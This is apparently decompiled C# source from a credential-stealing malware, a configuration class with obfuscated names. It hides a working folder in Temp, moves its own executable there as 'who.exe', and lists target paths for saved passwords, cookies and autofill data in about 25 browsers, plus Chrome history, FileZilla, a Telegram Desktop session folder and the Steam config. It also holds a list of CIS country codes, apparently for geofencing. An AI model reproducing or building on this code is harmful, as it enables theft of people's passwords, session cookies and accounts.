using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using Microsoft.Win32;

namespace ns14
{
	// Token: 0x0200001F RID: 31
	public class GClass9
	{
		// Token: 0x0600012C RID: 300 RVA: 0x00003C56 File Offset: 0x00001E56
		public static void smethod_0()
		{
			Console.WriteLine("DIR " + GClass9.string_6 + " Created!");
			Directory.CreateDirectory(GClass9.string_6).Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
		}

		// Token: 0x0600012D RID: 301 RVA: 0x00009E10 File Offset: 0x00008010
		public static void smethod_1()
		{
			if (File.Exists(GClass9.string_0 + "\\who.exe"))
			{
				try
				{
					File.Delete(GClass9.string_0 + "\\who.exe");
				}
				catch
				{
				}
			}
			try
			{
				File.Move(Directory.GetCurrentDirectory() + "\\" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name, GClass9.string_0 + "\\who.exe");
			}
			catch
			{
			}
		}

		// Token: 0x04000068 RID: 104
		public static string string_0 = Environment.GetEnvironmentVariable("Temp");

		// Token: 0x04000069 RID: 105
		public static string string_1 = Environment.GetEnvironmentVariable("LocalAppData");

		// Token: 0x0400006A RID: 106
		public static string string_2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x0400006B RID: 107
		public static string string_3 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

		// Token: 0x0400006C RID: 108
		public static string string_4 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

		// Token: 0x0400006D RID: 109
		public static string string_5 = Environment.UserName;

		// Token: 0x0400006E RID: 110
		public static string string_6 = GClass9.string_0 + "\\" + GClass9.string_5;

		// Token: 0x0400006F RID: 111
		public static string string_7 = GClass9.string_2 + "\\FileZilla";

		// Token: 0x04000070 RID: 112
		public static string string_8 = GClass9.string_2 + "\\Telegram Desktop\\tdata\\D877F783D5D3EF8C";

		// Token: 0x04000071 RID: 113
		public static string string_9 = (string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Valve\\Steam", "Steampath", null);

		// Token: 0x04000072 RID: 114
		public static string string_10 = GClass9.string_9 + "\\config";

		// Token: 0x04000073 RID: 115
		public static string string_11 = GClass9.string_6 + "\\Steam";

		// Token: 0x04000074 RID: 116
		public static string string_12 = "Login Data";

		// Token: 0x04000075 RID: 117
		public static string[] string_13 = new string[]
		{
			GClass9.string_1 + "\\Google\\Chrome\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_2 + "\\Opera Software\\Opera Stable\\" + GClass9.string_12,
			GClass9.string_1 + "\\Kometa\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\Orbitum\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\Comodo\\Dragon\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\Amigo\\User\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\Torch\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\CentBrowser\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\Go!\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\uCozMedia\\Uran\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\MapleStudio\\ChromePlus\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\Yandex\\YandexBrowser\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\BlackHawk\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\AcWebBrowser\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\CoolNovo\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\Epic Browser\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\Baidu Spark\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\Rockmelt\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\Sleipnir\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\SRWare Iron\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\Titan Browser\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\Flock\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\Vivaldi\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\Sputnik\\User Data\\Default\\" + GClass9.string_12,
			GClass9.string_1 + "\\Maxthon\\User Data\\Default\\" + GClass9.string_12
		};

		// Token: 0x04000076 RID: 118
		public static string string_14 = "Cookies";

		// Token: 0x04000077 RID: 119
		public static string[] string_15 = new string[]
		{
			GClass9.string_1 + "\\Google\\Chrome\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_2 + "\\Opera Software\\Opera Stable\\" + GClass9.string_14,
			GClass9.string_1 + "\\Kometa\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\Orbitum\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\Comodo\\Dragon\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\Amigo\\User\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\Torch\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\CentBrowser\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\Go!\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\uCozMedia\\Uran\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\MapleStudio\\ChromePlus\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\Yandex\\YandexBrowser\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\BlackHawk\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\AcWebBrowser\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\CoolNovo\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\Epic Browser\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\Baidu Spark\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\Rockmelt\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\Sleipnir\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\SRWare Iron\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\Titan Browser\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\Flock\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\Vivaldi\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\Sputnik\\User Data\\Default\\" + GClass9.string_14,
			GClass9.string_1 + "\\Maxthon\\User Data\\Default\\" + GClass9.string_14
		};

		// Token: 0x04000078 RID: 120
		public static string string_16 = "Web Data";

		// Token: 0x04000079 RID: 121
		public static string[] string_17 = new string[]
		{
			GClass9.string_1 + "\\Google\\Chrome\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_2 + "\\Opera Software\\Opera Stable\\" + GClass9.string_16,
			GClass9.string_1 + "\\Kometa\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\Orbitum\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\Comodo\\Dragon\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\Amigo\\User\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\Torch\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\CentBrowser\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\Go!\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\uCozMedia\\Uran\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\MapleStudio\\ChromePlus\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\Yandex\\YandexBrowser\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\BlackHawk\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\AcWebBrowser\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\CoolNovo\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\Epic Browser\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\Baidu Spark\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\Rockmelt\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\Sleipnir\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\SRWare Iron\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\Titan Browser\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\Flock\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\Vivaldi\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\Sputnik\\User Data\\Default\\" + GClass9.string_16,
			GClass9.string_1 + "\\Maxthon\\User Data\\Default\\" + GClass9.string_16
		};

		// Token: 0x0400007A RID: 122
		public static string[] string_18 = new string[]
		{
			GClass9.string_1 + "\\Google\\Chrome\\User Data\\Default\\History"
		};

		// Token: 0x0400007B RID: 123
		public static string[] string_19 = new string[]
		{
			"ru",
			"uk",
			"be",
			"kz",
			"ka",
			"ky",
			"uz"
		};

		// Token: 0x0400007C RID: 124
		public static string[] string_20 = new string[]
		{
			"Google Chrome",
			"Mozilla Firefox",
			"Opera Browser"
		};

		// Token: 0x0400007D RID: 125
		public static List<string> list_0 = new List<string>();
	}
}
